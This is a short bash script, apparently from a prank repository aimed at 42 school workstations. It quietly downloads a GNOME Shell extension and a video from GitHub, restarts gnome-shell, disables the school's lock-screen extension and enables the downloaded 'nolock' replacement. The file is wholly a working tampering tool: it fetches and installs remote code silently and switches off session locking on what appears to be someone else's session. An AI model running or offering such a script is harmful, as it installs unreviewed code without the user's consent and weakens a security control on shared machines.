#!/bin/bash

echo "[1/7] Creating extension directory..."
mkdir ~/.local/share/gnome-shell/extensions
mkdir ~/.local/share/gnome-shell/extensions/nolock@42network.org

echo "[2/7] Downloading metadata..."
curl -s -L -o "$HOME/.local/share/gnome-shell/extensions/nolock@42network.org/metadata.json" "https://raw.githubusercontent.com/godetremy/42-trolls/main/nolock/extension/metadata.json"

echo "[3/7] Downloading extension..."
curl -s -L -o "$HOME/.local/share/gnome-shell/extensions/nolock@42network.org/extension.js" "https://raw.githubusercontent.com/godetremy/42-trolls/main/nolock/extension/extension.js"

echo "[4/7] Downloading video..."
mkdir "$HOME/.nolock"
curl -s -L -o "$HOME/.nolock/no.mp4" "https://raw.githubusercontent.com/godetremy/42-trolls/main/nolock/no.mp4"

echo "[5/7] Relaunching Gnome (screen can be unresponsive, don't worrie)..."
killall -3 gnome-shell

echo "[6/7] Disabling the original lockscreen..."
gnome-extensions disable lockscreen@42network.org

echo "[7/7] Enabling new button..."
gnome-extensions enable nolock@42network.org
